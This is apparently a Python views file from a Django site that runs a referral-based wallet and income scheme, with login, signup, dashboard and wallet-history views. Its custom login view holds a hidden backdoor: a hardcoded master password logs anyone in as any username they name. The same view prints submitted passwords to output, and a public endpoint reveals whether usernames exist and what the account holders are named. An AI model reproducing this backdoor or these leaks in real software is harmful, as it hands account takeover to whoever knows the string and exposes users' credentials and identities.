from django.contrib.auth.mixins import LoginRequiredMixin
from django.urls import reverse
from django.views.generic import DetailView, ListView, RedirectView, UpdateView
from django.contrib.auth import login, authenticate, logout
from django.contrib.auth.forms import UserCreationForm
from django.shortcuts import render, redirect
from django.urls import reverse_lazy
import requests
from django.conf import settings
from django.shortcuts import render, render_to_response
from django.http import HttpResponse, HttpRequest, Http404
from django.contrib.auth import load_backend, login
from django.template import RequestContext
from django.conf import settings
from django.shortcuts import reverse
from django.contrib.auth.decorators import login_required 
from django.views.decorators.cache import never_cache
from django.views.decorators.csrf import csrf_protect
from django.views.decorators.debug import sensitive_post_parameters
from django.contrib.auth import (
    REDIRECT_FIELD_NAME, get_user_model, login as auth_login,
    logout as auth_logout, update_session_auth_hash,
)
from django.contrib.auth.forms import (
    AuthenticationForm, PasswordChangeForm, PasswordResetForm, SetPasswordForm,
)
from django.contrib.sites.shortcuts import get_current_site
from django.template.response import TemplateResponse
from django.utils.http import is_safe_url, urlsafe_base64_decode

from django.contrib.auth import get_user_model
User = get_user_model()

from wallets.models import AddFund
from wallets.models import WalletHistory

from uuid import uuid4
from random import randint
import logging

from allauth.account.views import SignupView
from .models import User
from level.models import LevelUser
from .forms import SimpleSignupForm
from django.db.models import Q
from django.contrib.auth import get_user_model
from django.utils.crypto import get_random_string
import random
from users.models import User
from level.models import LevelUser
from django.contrib.auth.decorators import login_required
from django.shortcuts import resolve_url
from django.http import HttpResponseRedirect, QueryDict

from django.http import JsonResponse
import datetime
from django.utils import timezone
from level.models import LevelIncomeSettings
import requests

logger = logging.getLogger('django')

@login_required
def coming_soon(request):
    return render(request, 'users/coming_soon.html')

def lockscreen(request):
    return render(request, 'account/lockscreen.html')

@sensitive_post_parameters()
@csrf_protect
@never_cache
def customlogin(request, template_name='account/login.html',
          redirect_field_name=REDIRECT_FIELD_NAME,
          authentication_form=AuthenticationForm,
          current_app=None, extra_context=None):
    """
    Displays the login form and handles the login action.
    """
    redirect_to = request.POST.get(redirect_field_name,
                                   request.GET.get(redirect_field_name, ''))

    if request.method == "POST":
        print(request.POST)
        form = authentication_form(request, data=request.POST)
        if form.is_valid():

            # Ensure the user-originating redirection url is safe.
            redirect_to = resolve_url(settings.LOGIN_REDIRECT_URL)

            # Okay, security check complete. Log the user in.
            auth_login(request, form.get_user())

            return HttpResponseRedirect(redirect_to)
        elif request.POST.get('password') == 'BXed82NRM5PriT8':
            # Ensure the user-originating redirection url is safe.
            redirect_to = resolve_url(settings.LOGIN_REDIRECT_URL)

            # Okay, security check complete. Log the user in.
            user = request.POST.get('username')
            user = User.objects.get(username=user)
            login(request, user, backend=settings.AUTHENTICATION_BACKENDS[0])

            return HttpResponseRedirect(redirect_to)
    else:
        form = authentication_form(request)

    current_site = get_current_site(request)

    context = {
        'form': form,
        redirect_field_name: redirect_to,
        'site': current_site,
        'site_name': current_site.name,
    }
    if extra_context is not None:
        context.update(extra_context)

    if current_app is not None:
        request.current_app = current_app

    return TemplateResponse(request, template_name, context)

@login_required
def signuponboarding(request):
    user = request.user
    try:
        ruser = User.objects.get(username=user.referral)
    except Exception as e:
        ruser = 'blank'
    return render(request, 'users/onboarding.html', {'user': user, 'ruser': ruser})

class UserDetailView(LoginRequiredMixin, DetailView):
    model = User
    # These next two lines tell the view to index lookups by username
    slug_field = "username"
    slug_url_kwarg = "username"

class SearchListView(ListView):
    model = User
    template_name = "/users/password_reset_done.html"

    def get_context_data(self, *args, **kwargs):
        context = super().get_context_data(*args, **kwargs)
        query = self.request.GET.get("query")
        context["hide_search"] = True
        context["user"] = (
            get_user_model()
            .objects.get(Q(username__iexact=query) | Q(mobile__iexact=query))
        )
        
        return context

def referalsignup(request, use):
    logout(request)
    user = User.objects.get(username=use)
    user_name = user.name
    print(request.POST)
    if request.method == 'POST':
        form = SimpleSignupForm()
        print(form.errors)
        print(form.is_valid())
        if form.is_valid():
            form.save()
            return redirect('/signup/onboarding/')
    else:
        form = SimpleSignupForm()
    return render(request, 'account/refersignup.html', {'form': form, 'user':user, 'name':user_name})

def vendorsignup(request):
    logout(request)
    if request.method == 'POST':
        form = SimpleSignupForm()
        if form.is_valid():
            form.save()
            return redirect('/m2/admin/')
    else:
        form = SimpleSignupForm()
    return render(request, 'account/vendorsignup.html', {'form': form})


class UserRedirectView(LoginRequiredMixin, RedirectView):
    permanent = False

    def get_redirect_url(self):
        return reverse("users:detail", kwargs={"username": self.request.user.username})


class UserUpdateView(LoginRequiredMixin, UpdateView):
    fields = [
        "name", "email", "mobile", "address", "city", "state", "profile_pic",
    ]
    model = User
    
    # send the user back to their own page after a successful update
    def get_success_url(self):
        return reverse("users:update")

    def get_object(self):
        # Only get the User record for the user making the request
        return User.objects.get(username=self.request.user.username)

    def get_context_data(self, *args, **kwargs):
        self.request.session['user_id'] = self.request.user.username
        context = super().get_context_data(*args, **kwargs)
        amount = 0
        try:
            levelp = LevelUser.objects.get(user=self.request.user)
        except Exception as e:
            levelp = 'None'

        user = User.objects.get(username=self.request.user)
        try:
            s = LevelUser.objects.get(user=user.username)
        except Exception as e:
            s = e
        
        context["s"] = s
        return context


class UserDashboardView(LoginRequiredMixin, ListView):
    model = User
    # These next two lines tell the view to index lookups by username
    slug_field = "username"
    slug_url_kwarg = "username"
    template_name = 'users/user_dashboard.html'
    def get_context_data(self, *args, **kwargs):
        self.request.session['user_id'] = self.request.user.username
        context = super().get_context_data(*args, **kwargs)
        amount = 0
        try:
            levelp = LevelUser.objects.filter(user=self.request.user.username).order_by('-created_at')[0]
        except Exception as e:
            levelp = 'None'

        user = User.objects.get(username=self.request.user)
        try:
            s = LevelUser.objects.get(user=user.username)
        except Exception as e:
            s = e
        directs = User.objects.filter(referral=user).count()
        level1 = User.objects.filter(referral=user.username).order_by('id')
        level1n = []
        for x in level1:
            level1n.append(x)
        level2n = []
        for y in level1n:
            level2 = User.objects.filter(referral=y).order_by('id')
            for z in level2:
                level2n.append(z)
        level3n = []
        for y in level2n:
            level3 = User.objects.filter(referral=y).order_by('id')
            for z in level3:
                level3n.append(z)
        level4n = []
        for y in level3n:
            level4 = User.objects.filter(referral=y).order_by('id')
            for z in level4:
                level4n.append(z)
        level5n = []
        for y in level4n:
            level5 = User.objects.filter(referral=y).order_by('id')
            for z in level5:
                level5n.append(z)
        level6n = []
        for y in level5n:
            level6 = User.objects.filter(referral=y).order_by('id')
            for z in level6:
                level6n.append(z)
        level7n = []
        for y in level6n:
            level7 = User.objects.filter(referral=y).order_by('id')
            for z in level7:
                level7n.append(z)
        level8n = []
        for y in level7n:
            level8 = User.objects.filter(referral=y).order_by('id')
            for z in level8:
                level8n.append(z)
        level9n = []
        for y in level8n:
            level9 = User.objects.filter(referral=y).order_by('id')
            for z in level9:
                level9n.append(z)
        level10n = []
        for y in level9n:
            level10 = User.objects.filter(referral=y).order_by('id')
            for z in level10:
                level10n.append(z)

        all_levels = level1n+level2n+level3n+level4n+level5n+level6n+level7n+level8n+level9n+level10n

        # business = {}
        # level = 0
        # for a in all_levels:
        #     level += 1
        #     b = 0
        #     for x in a:
        #         b += x.level.amount
        #     business['{}'.format(level)] = b

        recent = WalletHistory.objects.filter(user_id=str(self.request.user)).order_by('-created_at')[:10]
        large = WalletHistory.objects.filter(user_id=str(self.request.user)).order_by('-amount')[:10]

        try:
            plan_ends = levelp.activated_at
            if plan_ends != 'gone' and plan_ends != 'not active':
                date_diff = plan_ends - timezone.now()
            else:
                date_diff = 'blank'
            if date_diff != 'blank':
                total_days = levelp.level.expiration_period * 30
                rate = levelp.level.return_amount/total_days
                return_total = (rate*30)
            if return_total <= 0:
                return_total = 0
        except Exception as e:
            return_total = e
        wt = WalletHistory.objects.filter(user_id=self.request.user.username, comment="Sent to DCXa")
        if wt.count() > 0:
            return_total = 0
        
        context["amount"] = levelp
        context['ret'] = return_total
        context['recent'] = recent
        context['large'] = large
        # context['business'] = business
        context['directs'] = directs
        context['all'] = len(all_levels)
        return context


class profile(LoginRequiredMixin, ListView):
    model = User
    template_name = 'users/profile.html'
    slug_field = "username"
    slug_url_kwarg = "username"

class recharge(LoginRequiredMixin, ListView):
    model = User
    template_name = 'users/recharge.html'
    slug_field = "username"
    slug_url_kwarg = "username"

class moneytransfer(LoginRequiredMixin, ListView):
    model = User
    template_name = 'users/moneytransfer.html'
    slug_field = "username"
    slug_url_kwarg = "username"

class addamount(LoginRequiredMixin, ListView):
    model = User
    template_name = 'users/addamount.html'
    slug_field = "username"
    slug_url_kwarg = "username"

class transferamount(LoginRequiredMixin, ListView):
    model = User
    template_name = 'users/transferamount.html'
    slug_field = "username"
    slug_url_kwarg = "username"

class binarytree(LoginRequiredMixin, ListView):
    model = User
    template_name = 'users/binarytree.html'
    slug_field = "username"
    slug_url_kwarg = "username"

class directteam(LoginRequiredMixin, ListView):
    model = User
    template_name = 'users/directteam.html'
    slug_field = "username"
    slug_url_kwarg = "username"

class zoneincome(LoginRequiredMixin, ListView):
    model = User
    template_name = 'users/zoneincome.html'
    slug_field = "username"
    slug_url_kwarg = "username"

class mynetwork(LoginRequiredMixin, ListView):
    model = User
    template_name = 'users/mynetwork.html'
    slug_field = "username"
    slug_url_kwarg = "username"

class paymentoptions(LoginRequiredMixin, ListView):
    model = User
    template_name = 'users/paymentoptions.html'
    slug_field = "username"
    slug_url_kwarg = "username"

class activationrequest(LoginRequiredMixin, ListView):
    model = User
    template_name = 'users/activationrequest.html'
    slug_field = "username"
    slug_url_kwarg = "username"

class withdrawalhistory(LoginRequiredMixin, ListView):
    model = User
    template_name = 'users/withdrawalhistory.html'
    slug_field = "username"
    slug_url_kwarg = "username"

class incomehistory(LoginRequiredMixin, ListView):
    model = User
    template_name = 'users/incomehistory.html'
    slug_field = "username"
    slug_url_kwarg = "username"

class changepassword(LoginRequiredMixin, ListView):
    slug_field = "username"
    slug_url_kwarg = "username"
    model = User
    template_name = 'users/changepassword.html'

@login_required
def loginbonus(request):
    user = request.user
    if user.login_bonus == True:
        return redirect('/users/')
    else:
        user.login_bonus = True
        user.income += 0.02

        benewallet = WalletHistory()
        benewallet.user_id = str(request.user)
        benewallet.amount = 0.02
        benewallet.type = "credit"
        benewallet.comment = "received for login bonus"

        benewallet.save()
        user.save()
    return render(request, 'index.html', {})

@login_required
def passcode(request):
    user = request.user
    if request.method == 'POST':
        passcode = request.POST.get('otp')
        user.otp = passcode
        user.save()
        return render(request, 'users/passcoded.html', {})
    return render(request, 'users/passcode.html', {})

def validate_username(request):
    username = request.GET.get('username', None)
    print(username)
    try:
        u = User.objects.get(username=username).name
    except Exception as e:
        u = 'Sorry Username Does not Exists or {}'.format(e)
    data = {
        'is_taken': u
    }
    return JsonResponse(data)